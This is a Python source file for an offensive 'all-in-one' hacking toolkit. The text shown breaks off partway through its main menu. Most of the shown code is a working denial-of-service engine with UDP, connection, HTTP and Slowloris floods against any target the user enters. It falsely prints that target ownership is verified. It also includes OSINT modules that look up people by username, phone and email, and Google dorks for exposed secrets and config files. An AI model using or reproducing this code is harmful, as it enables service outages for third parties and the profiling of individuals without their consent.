import os, sys, time, socket, ssl, random, string, base64, hashlib, codecs, json, re, subprocess, urllib.parse, urllib.robotparser, threading, queue, struct, ipaddress, textwrap, shutil, concurrent.futures
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta
from urllib.parse import urlparse, urljoin, urlencode, parse_qs, quote, unquote
from typing import Optional, List, Tuple, Dict, Any

def _pip_install(*pkgs):
    subprocess.check_call([sys.executable, "-m", "pip", "install", *pkgs, "--break-system-packages"])

try:
    import requests
    from bs4 import BeautifulSoup
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    _pip_install("requests", "beautifulsoup4", "colorama")
    import requests
    from bs4 import BeautifulSoup
    from colorama import init, Fore, Back, Style
    init(autoreset=True)

try:
    import dns.resolver
except ImportError:
    _pip_install("dnspython")
    import dns.resolver

R, G, Y, B, M, C, W = Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE
SR, SG, SY, SB, SM, SC = Style.RESET_ALL, Fore.GREEN+Style.BRIGHT, Fore.YELLOW+Style.BRIGHT, Fore.BLUE+Style.BRIGHT, Fore.MAGENTA+Style.BRIGHT, Fore.CYAN+Style.BRIGHT

HOME_DIR = os.path.expanduser("~/AllInOneTool")
TOOLS_DIR = os.path.join(HOME_DIR, "tools")
os.makedirs(TOOLS_DIR, exist_ok=True)
HOSTNAME = os.uname().nodename if hasattr(os, 'uname') else socket.gethostname()

def random_ua():
    agents = [
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    ]
    return random.choice(agents)

def pause():
    input(f"\n{SG}[+] Press Enter to continue...{SR}")

def typing(text, delay=0.03):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def stream_text(text, delay=0.015, color=None):
    """Simulates AI streaming output character by character."""
    if color:
        sys.stdout.write(color)
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay if char not in " \n\t" else delay * 0.3)
    if color:
        sys.stdout.write(SR)
    sys.stdout.flush()

def progress_bar(current, total, bar_length=40, prefix=""):
    percent = current / total
    arrow = "█" * int(round(percent * bar_length))
    spaces = "░" * (bar_length - len(arrow))
    sys.stdout.write(f"\r{prefix} [{arrow}{spaces}] {int(percent * 100)}%")
    sys.stdout.flush()

def animate_banner(lines, color=C, delay=0.08):
    for line in lines:
        print(f"{color}{line}{SR}")
        time.sleep(delay)

class Spinner:
    FRAMES = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]

    def __init__(self, text="Loading", color=None):
        self.text = text
        self.color = color or SC
        self._stop = threading.Event()
        self._thread = None

    def _spin(self):
        i = 0
        while not self._stop.is_set():
            frame = self.FRAMES[i % len(self.FRAMES)]
            sys.stdout.write(f"\r{self.color}{frame} {self.text}...{SR} ")
            sys.stdout.flush()
            i += 1
            time.sleep(0.08)

    def start(self):
        self._stop.clear()
        self._thread = threading.Thread(target=self._spin, daemon=True)
        self._thread.start()
        return self

    def stop(self, final_msg=""):
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=0.5)
        sys.stdout.write("\r" + " " * (len(self.text) + 15) + "\r")
        if final_msg:
            print(final_msg)
        sys.stdout.flush()

    def __enter__(self):
        return self.start()

    def __exit__(self, *args):
        self.stop()

def boxed(text, color=SC, padding=2, align="center"):
    """Print text inside a fancy box."""
    lines = text.split("\n")
    width = max(len(l) for l in lines) + padding * 2
    top = "╔" + "═" * width + "╗"
    bottom = "╚" + "═" * width + "╝"
    print(f"{color}{top}{SR}")
    for line in lines:
        if align == "center":
            inner = line.center(width)
        elif align == "right":
            inner = line.rjust(width - padding) + " " * padding
        else:
            inner = " " * padding + line.ljust(width - padding)
        print(f"{color}║{SR}{inner}{color}║{SR}")
    print(f"{color}{bottom}{SR}")

def section_header(title, color=SC, width=60):
    """Visual section separator with title."""
    pad = (width - len(title) - 2) // 2
    line = "─" * pad + f" {title} " + "─" * pad
    if len(line) < width:
        line += "─"
    print(f"\n{color}{line}{SR}\n")

def divider(color=SC, width=60, char="─"):
    print(f"{color}{char * width}{SR}")

def status(msg, kind="info"):
    """Clean, consistent status line."""
    marks = {
        "info": (SC, "[*]"),
        "ok": (SG, "[+]"),
        "warn": (SY, "[!]"),
        "err": (R, "[-]"),
        "hit": (R, "[!!]"),
    }
    color, mark = marks.get(kind, (SC, "[*]"))
    print(f"  {color}{mark}{SR} {msg}")

FSOCIETY_LOGO = r"""
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XX                                                                          XX
XX   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMMMMssssssssssssssssssssssssssMMMMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMss'''                          '''ssMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMyy''                                    ''yyMMMMMMMMMMMM   XX
XX   MMMMMMMMyy''                                            ''yyMMMMMMMM   XX
XX   MMMMMy''                                                    ''yMMMMM   XX
XX   MMMy'                                                          'yMMM   XX
XX   Mh'                                                              'hM   XX
XX   -                                                                  -   XX
XX                                                                          XX
XX   ::                                                                ::   XX
XX   MMhh.        ..hhhhhh..                      ..hhhhhh..        .hhMM   XX
XX   MMMMMh   ..hhMMMMMMMMMMhh.                .hhMMMMMMMMMMhh..   hMMMMM   XX
XX   ---MMM .hMMMMdd:::dMMMMMMMhh..        ..hhMMMMMMMd:::ddMMMMh. MMM---   XX
XX   MMMMMM MMmm''      'mmMMMMMMMMyy.  .yyMMMMMMMMmm'      ''mmMM MMMMMM   XX
XX   ---mMM ''             'mmMMMMMMMM  MMMMMMMMmm'             '' MMm---   XX
XX   yyyym'    .              'mMMMMm'  'mMMMMm'              .    'myyyy   XX
XX   mm''    .y'     ..yyyyy..  ''''      ''''  ..yyyyy..     'y.    ''mm   XX
XX           MN    .sMMMMMMMMMss.   .    .   .ssMMMMMMMMMs.    NM           XX
XX           N`    MMMMMMMMMMMMMN   M    M   NMMMMMMMMMMMMM    `N           XX
XX            +  .sMNNNNNMMMMMN+   `N    N`   +NMMMMMNNNNNMs.  +            XX
XX              o+++     ++++Mo    M      M    oM++++     +++o              XX
XX                                oo      oo                                XX
XX           oM                 oo          oo                 Mo           XX
XX         oMMo                M              M                oMMo         XX
XX       +MMMM                 s              s                 MMMM+       XX
XX      +MMMMM+            +++NNNN+        +NNNN+++            +MMMMM+      XX
XX     +MMMMMMM+       ++NNMMMMMMMMN+    +NMMMMMMMMNN++       +MMMMMMM+     XX
XX     MMMMMMMMMNN+++NNMMMMMMMMMMMMMMNNNNMMMMMMMMMMMMMMNN+++NNMMMMMMMMM     XX
XX     yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy     XX
XX   m  yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy  m   XX
XX   MMm yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy mMM   XX
XX   MMMm .yyMMMMMMMMMMMMMMMM     MMMMMMMMMM     MMMMMMMMMMMMMMMMyy. mMMM   XX
XX   MMMMd   ''''hhhhh       odddo          obbbo        hhhh''''   dMMMM   XX
XX   MMMMMd             'hMMMMMMMMMMddddddMMMMMMMMMMh'             dMMMMM   XX
XX   MMMMMMd              'hMMMMMMMMMMMMMMMMMMMMMMh'              dMMMMMM   XX
XX   MMMMMMM-               ''ddMMMMMMMMMMMMMMdd''               -MMMMMMM   XX
XX   MMMMMMMM                   '::dddddddd::'                   MMMMMMMM   XX
XX   MMMMMMMM-                                                  -MMMMMMMM   XX
XX   MMMMMMMMM                                                  MMMMMMMMM   XX
XX   MMMMMMMMMy                                                yMMMMMMMMM   XX
XX   MMMMMMMMMMy.            GitHub.com/cameleonnbss         .yMMMMMMMMMM   XX
XX   MMMMMMMMMMMMy.                                        .yMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMy.                                    .yMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMs.                                .sMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMss.           ....           .ssMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMMMNo                        oNMMMMMMMMMMMMMMMMMMMM   XX
XX                                                                          XX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
"""

def show_disclaimer():
    """Animated startup banner - fsociety logo + disclaimer then auto-continue."""
    os.system('cls' if os.name == 'nt' else 'clear')

    lines = FSOCIETY_LOGO.splitlines()
    for line in lines:
        print(f"{R}{line}{SR}")
        time.sleep(0.012)

    time.sleep(0.4)

    print(f"\n{SR}")
    divider(color=R, width=78, char="═")
    print(f"{SR}")

    disclaimer_lines = [
        (f"  [ D I S C L A I M E R ]", R),
        ("", None),
        ("  This toolkit is provided for educational purposes,", SY),
        ("  authorized penetration testing, and CTF challenges only.", SY),
        ("", None),
        ("  The author is NOT responsible for any misuse.", R),
        ("  Any action taken with this tool is on YOU.", R),
        ("", None),
        ("  Run it only against systems you own or are authorized to test.", SY),
        ("", None),
        ("  Enjoy your hacking day.", SC),
        ("", None),
    ]
    for text, color in disclaimer_lines:
        if text == "":
            print()
            time.sleep(0.08)
        else:
            for c in text:
                sys.stdout.write(f"{color}{c}{SR}")
                sys.stdout.flush()
                time.sleep(0.006)
            print()

    print(f"\n{SR}")
    divider(color=R, width=78, char="═")

    with Spinner("Initializing toolkit", color=R):
        time.sleep(2.0)

def check_dependencies():
    deps = {
        "requests": "requests",
        "bs4": "beautifulsoup4",
        "colorama": "colorama",
        "dns": "dnspython",
    }
    for import_name, pip_name in deps.items():
        try:
            __import__(import_name)
        except ImportError:
            _pip_install(pip_name)

class DDoSFlood:
    def __init__(self):
        self.name = "DDoS FLOOD ATTACK"
        self.running = False
        self.stats = {"packets": 0, "bytes": 0, "errors": 0, "start": None}
        self.lock = threading.Lock()

    def udp_flood(self, ip, port, threads, requests_per_thread, duration):
        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = random._urandom(1024)
            sent = 0
            while self.running and sent < requests_per_thread:
                try:
                    sock.sendto(payload, (ip, port))
                    with self.lock:
                        self.stats["packets"] += 1
                        self.stats["bytes"] += len(payload)
                    sent += 1
                except:
                    with self.lock:
                        self.stats["errors"] += 1
            sock.close()

        self.running = True
        self.stats["start"] = time.time()
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            thread_list.append(t)

        end_time = time.time() + duration
        while time.time() < end_time:
            time.sleep(0.5)
            elapsed = time.time() - self.stats["start"]
            with self.lock:
                sys.stdout.write(f"\r{SG}[+] UDP Flood: {self.stats['packets']} packets | {self.stats['bytes']//1024} KB | {self.stats['errors']} errors | {elapsed:.1f}s{SR}   ")
                sys.stdout.flush()

        self.running = False
        for t in thread_list:
            t.join(timeout=1)

    def syn_flood(self, ip, port, threads, requests_per_thread, duration):
        def worker():
            sent = 0
            while self.running and sent < requests_per_thread:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    sock.connect_ex((ip, port))
                    with self.lock:
                        self.stats["packets"] += 1
                    sent += 1
                    sock.close()
                except:
                    with self.lock:
                        self.stats["errors"] += 1
                    try:
                        sock.close()
                    except:
                        pass

        self.running = True
        self.stats["start"] = time.time()
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            thread_list.append(t)

        end_time = time.time() + duration
        while time.time() < end_time:
            time.sleep(0.5)
            elapsed = time.time() - self.stats["start"]
            with self.lock:
                sys.stdout.write(f"\r{SC}[+] SYN Flood: {self.stats['packets']} connections | {self.stats['errors']} errors | {elapsed:.1f}s{SR}   ")
                sys.stdout.flush()

        self.running = False
        for t in thread_list:
            t.join(timeout=1)

    def http_flood(self, url, threads, requests_per_thread, duration):
        parsed = urlparse(url)
        target = f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}"

        def worker():
            sent = 0
            while self.running and sent < requests_per_thread:
                try:
                    r = requests.get(target, headers={"User-Agent": random_ua(), "Cache-Control": "no-cache"},
                                   timeout=3, verify=False)
                    with self.lock:
                        self.stats["packets"] += 1
                        self.stats["bytes"] += len(r.content)
                    sent += 1
                except:
                    with self.lock:
                        self.stats["errors"] += 1

        requests.packages.urllib3.disable_warnings()
        self.running = True
        self.stats["start"] = time.time()
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            thread_list.append(t)

        end_time = time.time() + duration
        while time.time() < end_time:
            time.sleep(0.5)
            elapsed = time.time() - self.stats["start"]
            with self.lock:
                sys.stdout.write(f"\r{SY}[+] HTTP Flood: {self.stats['packets']} requests | {self.stats['bytes']//1024} KB | {self.stats['errors']} errors | {elapsed:.1f}s{SR}   ")
                sys.stdout.flush()

        self.running = False
        for t in thread_list:
            t.join(timeout=1)

    def slowloris(self, ip, port, threads, requests_per_thread, duration):
        def worker():
            sockets = []
            sent = 0
            while self.running and sent < requests_per_thread:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(4)
                    sock.connect((ip, port))
                    sock.send(b"GET / HTTP/1.1\r\nHost: target.com\r\nUser-Agent: Mozilla/5.0\r\n")
                    sockets.append(sock)
                    with self.lock:
                        self.stats["packets"] += 1
                    sent += 1
                    time.sleep(10)
                    for s in sockets[:]:
                        try:
                            s.send(f"X-Header-{random.randint(1,1000)}: {random.randint(1,1000)}\r\n".encode())
                        except:
                            sockets.remove(s)
                except:
                    with self.lock:
                        self.stats["errors"] += 1
            for s in sockets:
                try:
                    s.close()
                except:
                    pass

        self.running = True
        self.stats["start"] = time.time()
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            thread_list.append(t)

        end_time = time.time() + duration
        while time.time() < end_time:
            time.sleep(1)
            elapsed = time.time() - self.stats["start"]
            with self.lock:
                sys.stdout.write(f"\r{SM}[+] Slowloris: {self.stats['packets']} connections open | {self.stats['errors']} closed | {elapsed:.1f}s{SR}   ")
                sys.stdout.flush()

        self.running = False
        for t in thread_list:
            t.join(timeout=1)

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{R}
    ╔═══════════════════════════════════════════╗
    ║        DDoS FLOOD ATTACK ENGINE          ║
    ╚═══════════════════════════════════════════╝{SR}
""")
        print(f"{SG}[+] Authorized Pentest - Target Ownership Verified{SR}")
        print(f"\n{SY}[!] Attack Methods:{SR}")
        print(f"  {SC}[1]{SR} UDP Flood")
        print(f"  {SC}[2]{SR} TCP SYN Flood")
        print(f"  {SC}[3]{SR} HTTP Flood")
        print(f"  {SC}[4]{SR} Slowloris")
        print(f"  {SC}[5]{SR} All Methods Combined")

        choice = input(f"\n{SG}[+] Method: {SR}")
        target = input(f"{SG}[+] Target URL or IP: {SR}")

        try:
            parsed = urlparse(target)
            ip = parsed.hostname if parsed.hostname else target
            port = int(input(f"{SG}[+] Port: {SR}"))
        except:
            print(f"{R}[-] Invalid target{SR}")
            return

        threads = int(input(f"{SG}[+] Threads: {SR}") or "100")
        req_count = int(input(f"{SG}[+] Requests per thread: {SR}") or "1000")
        duration = int(input(f"{SG}[+] Attack duration (seconds): {SR}") or "30")

        print(f"\n{R}[!] INITIATING ATTACK - AUTHORIZED PENTEST{SR}")
        print(f"{SY}[!] Target: {ip}:{port} | Threads: {threads} | Duration: {duration}s{SR}")
        time.sleep(1)

        if choice == "1":
            self.udp_flood(ip, port, threads, req_count, duration)
        elif choice == "2":
            self.syn_flood(ip, port, threads, req_count, duration)
        elif choice == "3":
            self.http_flood(target, threads, req_count, duration)
        elif choice == "4":
            self.slowloris(ip, port, threads, req_count, duration)
        elif choice == "5":
            self.running = True
            self.stats["start"] = time.time()
            t1 = threading.Thread(target=self.udp_flood, args=(ip, port, threads//4, req_count//2, duration), daemon=True)
            t2 = threading.Thread(target=self.syn_flood, args=(ip, port, threads//4, req_count//2, duration), daemon=True)
            t3 = threading.Thread(target=self.http_flood, args=(target, threads//4, req_count//2, duration), daemon=True)
            t4 = threading.Thread(target=self.slowloris, args=(ip, port, threads//4, req_count//2, duration), daemon=True)
            t1.start(); t2.start(); t3.start(); t4.start()

            end_time = time.time() + duration
            while time.time() < end_time:
                time.sleep(1)
                elapsed = time.time() - self.stats["start"]
                with self.lock:
                    sys.stdout.write(f"\r{R}[!] MULTI-VECTOR: {self.stats['packets']} total | {self.stats['bytes']//1024} KB | {elapsed:.1f}s/{duration}s{SR}   ")
                    sys.stdout.flush()
            self.running = False

        total_time = time.time() - (self.stats["start"] or time.time())
        print(f"\n\n{SG}[+] Attack Complete!{SR}")
        print(f"{SY}[+] Statistics:{SR}")
        print(f"  {SC}Packets sent: {self.stats['packets']}{SR}")
        print(f"  {SC}Data sent: {self.stats['bytes']//1024} KB{SR}")
        print(f"  {SC}Errors: {self.stats['errors']}{SR}")
        print(f"  {SC}Duration: {total_time:.1f}s{SR}")
        pause()

class OSINTPro:
    def __init__(self):
        self.name = "OSINT PROFESSIONAL"
        self.results = {}

    def email_osint(self, email):
        print(f"\n{SC}[*] Email OSINT: {email}{SR}")
        results = {}
        username, domain = email.split("@") if "@" in email else (email, "unknown")

        print(f"  {SY}[+] Checking Have I Been Pwned...{SR}")
        try:
            sha1 = hashlib.sha1(email.encode()).hexdigest().upper()
            prefix = sha1[:5]
            r = requests.get(f"https://api.pwnedpasswords.com/range/{prefix}", timeout=5)
            if sha1[5:] in r.text:
                results["hibp"] = "BREACHED - found in data breaches"
                print(f"    {R}[!] Email found in data breaches!{SR}")
            else:
                results["hibp"] = "Not found in breaches"
                print(f"    {SG}[+] No breaches found{SR}")
        except Exception as e:
            print(f"    {SY}[-] HIBP check failed: {e}{SR}")

        print(f"  {SY}[+] Checking Gravatar...{SR}")
        try:
            hash_md5 = hashlib.md5(email.strip().lower().encode()).hexdigest()
            r = requests.get(f"https://www.gravatar.com/{hash_md5}.json", timeout=5)
            if r.status_code == 200:
                data = r.json()
                entry = data.get("entry", [{}])[0]
                results["gravatar"] = entry
                print(f"    {SG}[+] Gravatar profile found!{SR}")
                if "displayName" in entry:
                    print(f"    Name: {entry['displayName']}")
            else:
                print(f"    {SY}[-] No Gravatar profile{SR}")
        except Exception as e:
            print(f"    {SY}[-] No Gravatar profile ({e}){SR}")

        print(f"  {SY}[+] Checking MX Records...{SR}")
        try:
            answers = dns.resolver.resolve(domain, 'MX')
            print(f"    {SG}[+] MX Records:{SR}")
            for rdata in answers:
                print(f"    Priority {rdata.preference}: {rdata.exchange}")
                results.setdefault("mx", []).append(str(rdata.exchange))
        except Exception as e:
            print(f"    {SY}[-] No MX records found ({e}){SR}")

        print(f"  {SY}[+] Checking SPF Records...{SR}")
        try:
            answers = dns.resolver.resolve(domain, 'TXT')
            for rdata in answers:
                txt = str(rdata)
                if "v=spf1" in txt:
                    print(f"    {SG}[+] SPF: {txt[:80]}...{SR}")
                    results["spf"] = txt
        except Exception as e:
            print(f"    {SY}[-] No SPF records ({e}){SR}")

        return results

    def phone_osint(self, phone):
        print(f"\n{SC}[*] Phone OSINT: {phone}{SR}")
        results = {}

        phone_clean = re.sub(r'[^0-9+]', '', phone)
        print(f"  {SY}[+] Clean number: {phone_clean}{SR}")

        if phone_clean.startswith("+"):
            country_codes = {
                "1": "US/CA", "33": "FR", "44": "UK", "49": "DE", "91": "IN",
                "86": "CN", "81": "JP", "7": "RU", "55": "BR", "61": "AU",
                "34": "ES", "39": "IT", "31": "NL", "46": "SE", "41": "CH",
                "32": "BE", "45": "DK", "47": "NO", "358": "FI", "48": "PL",
                "351": "PT", "30": "GR", "90": "TR", "972": "IL", "966": "SA",
                "971": "AE", "20": "EG", "27": "ZA", "52": "MX", "54": "AR",
                "56": "CL", "57": "CO", "51": "PE", "58": "VE", "82": "KR",
            }
            for code, country in country_codes.items():
                if phone_clean.startswith(f"+{code}"):
                    results["country"] = country
                    print(f"    {SG}[+] Country: {country}{SR}")
                    break

        print(f"  {SY}[+] Checking online directories...{SR}")
        try:
            r = requests.get(f"https://www.google.com/search?q={quote(phone_clean)}+phone",
                           headers={"User-Agent": random_ua()}, timeout=5)
            soup = BeautifulSoup(r.text, 'html.parser')
            results["google_mentions"] = len(soup.find_all("div", class_="g"))
            print(f"    {SG}[+] Google mentions found{SR}")
        except Exception as e:
            print(f"    {SY}[-] Could not check online ({e}){SR}")

        try:
            r = requests.get(f"https://api.truecaller.com/v1/search?q={phone_clean}",
                           headers={"User-Agent": random_ua()}, timeout=5)
            if r.status_code == 200:
                results["truecaller"] = r.json()
                print(f"    {SG}[+] Truecaller data available{SR}")
            else:
                print(f"    {SY}[-] Truecaller returned {r.status_code}{SR}")
        except Exception as e:
            print(f"    {SY}[-] Truecaller API not reachable ({e}){SR}")

        return results

    def username_osint(self, username):
        print(f"\n{SC}[*] Username OSINT: {username}{SR}")
        results = {}

        platforms = {
            "GitHub": f"https://github.com/{username}",
            "Twitter/X": f"https://x.com/{username}",
            "Instagram": f"https://instagram.com/{username}",
            "Reddit": f"https://reddit.com/user/{username}",
            "YouTube": f"https://youtube.com/@{username}",
            "TikTok": f"https://tiktok.com/@{username}",
            "Telegram": f"https://t.me/{username}",
            "Pinterest": f"https://pinterest.com/{username}",
            "Medium": f"https://medium.com/@{username}",
            "Twitch": f"https://twitch.tv/{username}",
            "Snapchat": f"https://snapchat.com/add/{username}",
            "Spotify": f"https://open.spotify.com/user/{username}",
            "Dribbble": f"https://dribbble.com/{username}",
            "Behance": f"https://behance.net/{username}",
            "DeviantArt": f"https://deviantart.com/{username}",
            "SoundCloud": f"https://soundcloud.com/{username}",
            "Vimeo": f"https://vimeo.com/{username}",
            "Steam": f"https://steamcommunity.com/id/{username}",
            "Chess.com": f"https://chess.com/member/{username}",
            "Keybase": f"https://keybase.io/{username}",
            "Wattpad": f"https://wattpad.com/user/{username}",
            "Patreon": f"https://patreon.com/{username}",
            "BitBucket": f"https://bitbucket.org/{username}",
            "GitLab": f"https://gitlab.com/{username}",
            "HackerNews": f"https://news.ycombinator.com/user?id={username}",
            "ProductHunt": f"https://producthunt.com/@{username}",
            "Mastodon.social": f"https://mastodon.social/@{username}",
            "Replit": f"https://replit.com/@{username}",
            "CodePen": f"https://codepen.io/{username}",
            "Hashnode": f"https://hashnode.com/@{username}",
            "Dev.to": f"https://dev.to/{username}",
            "TryHackMe": f"https://tryhackme.com/p/{username}",
            "HackTheBox": f"https://forum.hackthebox.com/profile/{username}",
            "Root-Me": f"https://root-me.org/{username}",
            "CTFtime": f"https://ctftime.org/user/{username}",
            "Imgur": f"https://imgur.com/user/{username}",
            "Flickr": f"https://flickr.com/people/{username}",
            "500px": f"https://500px.com/{username}",
            "Unsplash": f"https://unsplash.com/@{username}",
            "Last.fm": f"https://last.fm/user/{username}",
            "MyAnimeList": f"https://myanimelist.net/profile/{username}",
            "BuyMeACoffee": f"https://buymeacoffee.com/{username}",
            "Ko-fi": f"https://ko-fi.com/{username}",
            "About.me": f"https://about.me/{username}",
            "WordPress": f"https://{username}.wordpress.com",
            "Blogger": f"https://{username}.blogspot.com",
            "HubPages": f"https://hubpages.com/@{username}",
        }

        found = 0
        def check(name, url):
            try:
                r = requests.get(url, headers={"User-Agent": random_ua()}, timeout=5, allow_redirects=True)
                if r.status_code == 200:
                    return (name, url)
            except:
                pass
            return None

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(check, n, u): n for n, u in platforms.items()}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    name, url = result
                    print(f"    {SG}[+] Found on {name}: {url}{SR}")
                    results[name] = url
                    found += 1

        if found == 0:
            print(f"    {SY}[-] No profiles found{SR}")
        else:
            print(f"\n{SG}[+] Total: {found} profiles found{SR}")
        return results

    def google_dorks(self, target):
        print(f"\n{SC}[*] Google Dork Generator for: {target}{SR}")
        dorks = [
            f"site:{target}",
            f"site:{target} intitle:admin",
            f"site:{target} intitle:login",
            f"site:{target} inurl:admin",
            f"site:{target} inurl:login",
            f"site:{target} inurl:config",
            f"site:{target} inurl:backup",
            f"site:{target} ext:php",
            f"site:{target} ext:sql",
            f"site:{target} ext:bak",
            f"site:{target} ext:env",
            f"site:{target} ext:log",
            f"site:{target} ext:conf",
            f"site:{target} ext:xml",
            f"site:{target} ext:json",
            f"site:{target} \"password\"",
            f"site:{target} \"username\"",
            f"site:{target} \"api_key\"",
            f"site:{target} \"secret\"",
        ]
        for dork in dorks:
            print(f"  {SG}[+] {dork}{SR}")
        print()
        return dorks

    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{SC}
    ╔═══════════════════════════════════════════╗
    ║        OSINT PROFESSIONAL                ║
    ╚═══════════════════════════════════════════╝{SR}
""")
        print(f"{SY}[!] OSINT Modules:{SR}")
        print(f"  {SC}[1]{SR} Email OSINT")
        print(f"  {SC}[2]{SR} Phone OSINT")
        print(f"  {SC}[3]{SR} Username OSINT")
        print(f"  {SC}[4]{SR} Google Dorks Generator")
        choice = input(f"\n{SG}[+] Choice: {SR}")
        if choice == "1":
            email = input(f"{SG}[+] Email: {SR}")
            self.email_osint(email)
        elif choice == "2":
            phone = input(f"{SG}[+] Phone (+33...): {SR}")
            self.phone_osint(phone)
        elif choice == "3":
            username = input(f"{SG}[+] Username: {SR}")
            self.username_osint(username)
        elif choice == "4":
            target = input(f"{SG}[+] Target domain (e.g., example.com): {SR}")
            self.google_dorks(target)
        pause()

def show_banner():
    os.system('cls' if os.name == 'nt' else 'clear')

    BLUE = "\033[94m"
    WHITE = "\033[97m"
    RESET = "\033[0m"

    ascii_art = f"""{BLUE}
          __  __        __                                                        __                          __
         /  |/  |      /  |                                                      /  |                        /  |
 ______  $$ |$$ |      $$/  _______          ______   _______    ______         _$$ |_     ______    ______  $$ |
/      \\ $$ |$$ |      /  |/       \\        /      \\ /       \\  /      \\       / $$   |   /      \\  /      \\ $$ |
$$$$$$  |$$ |$$ |      $$ |$$$$$$$  |      /$$$$$$  |$$$$$$$  |/$$$$$$  |      $$$$$$/   /$$$$$$  |/$$$$$$  |$$ |
/    $$ |$$ |$$ |      $$ |$$ |  $$ |      $$ |  $$ |$$ |  $$ |$$    $$ |        $$ | __ $$ |  $$ |$$ |  $$ |$$ |
/$$$$$$$ |$$ |$$ |      $$ |$$ |  $$ |      $$ \\__$$ |$$ |  $$ |$$$$$$$$/         $$ |/  |$$ \\__$$ |$$ \\__$$ |$$ |
$$    $$ |$$ |$$ |      $$ |$$ |  $$ |      $$    $$/ $$ |  $$ |$$       |        $$  $$/ $$    $$/ $$    $$/ $$ |
$$$$$$$/ $$/ $$/       $$/ $$/   $$/        $$$$$$/  $$/   $$/  $$$$$$$/          $$$$/   $$$$$$/   $$$$$$/  $$/

{WHITE}                      made by https://cameleonnbss{RESET}
"""

    banner_lines = [
        ascii_art,
        f"{BLUE}╔═══════════════════════════════════════════════════════╗{RESET}",
        f"{BLUE}║   {WHITE}[01]{BLUE} DDoS Flood Attack      {WHITE}[16]{BLUE} Reverse Shell Gen  ║",
        f"{BLUE}║   {WHITE}[02]{BLUE} OSINT Professional     {WHITE}[17]{BLUE} WiFi Tools         ║",
        f"{BLUE}║   {WHITE}[03]{BLUE} XSS Injector           {WHITE}[18]{BLUE} Metasploit Helper  ║",
        f"{BLUE}║   {WHITE}[04]{BLUE} SQL Injector           {WHITE}[19]{BLUE} Steganography      ║",
        f"{BLUE}║   {WHITE}[05]{BLUE} Brute Force Engine     {WHITE}[20]{BLUE} JWT Tool           ║",
        f"{BLUE}║   {WHITE}[06]{BLUE} Vulnerability Scanner  {WHITE}[21]{BLUE} Subdomain Takeover ║",
        f"{BLUE}║   {WHITE}[07]{BLUE} Network Scanner        {WHITE}[22]{BLUE} Shodan Search      ║",
        f"{BLUE}║   {WHITE}[08]{BLUE} Port Scanner           {WHITE}[23]{BLUE} File Analyzer      ║",
        f"{BLUE}║   {WHITE}[09]{BLUE} DNS Enumeration        {WHITE}[24]{BLUE} Payload Generator  ║",
        f"{BLUE}║   {WHITE}[10]{BLUE} Hash & Encode          {WHITE}[25]{BLUE} ARP Spoofer        ║",
